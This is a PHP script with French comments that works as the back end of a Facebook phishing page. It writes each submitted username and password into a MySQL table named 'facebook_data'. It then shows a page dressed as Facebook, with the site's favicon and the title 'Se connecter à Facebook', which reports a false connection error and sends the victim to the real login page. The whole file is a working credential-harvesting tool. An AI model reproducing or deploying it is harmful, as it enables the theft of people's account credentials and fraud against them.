<?php



//Ouverture  d'une connexion à la DataBase Ajoute

$objetPdo   =   new PDO('mysql:host=localhost;dbname=facebook', 'root', '');


//Preparer de la requete d'insertion (SQl)

$pdoStat = $objetPdo->prepare('INSERT INTO    facebook_data     VALUES (NULL, :UserName, :password)');

//On lit chaque marqueur à sa valeur 
$pdoStat->bindValue(':UserName', $_POST['UserName'], PDO::PARAM_STR);

$pdoStat->bindValue(':password', $_POST['password'], PDO::PARAM_STR);



//Exécuttion de la requette préparée
$insertIsok = $pdoStat->execute();

if ($insertIsok) {
    $facebook_data = 'Vous avez entré un email, un numéro érroné ou un mot de passe incorrect';
} else {
    $facebook_data = 'Vous avez entré un email, un numéro érroné ou un mot de passe incorrect';
}
?>



<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" alt="facebook icon">
    <link rel="stylesheet" href="./php_css/index.css">
    <title>Se connecter à Facebook</title>
</head>

<body>



    
    
        
    <div id="erreur">
        <div id="error">
              <h2>Erreur de connexion</h2>
        </div>  

       <div id="txt_error"></div>
             Une erreur inattendue s'est produite. Veillez réessayer à nouveau.

            <!-- <?php echo $facebook_data;?> -->

                <center>
                    <button>
                        <a href="https://www.facebook.com/login/" id="bt">Réessayer</a>
                    </button>
                </center>
                

        </div>

    </div>
    


   


</body>

</html>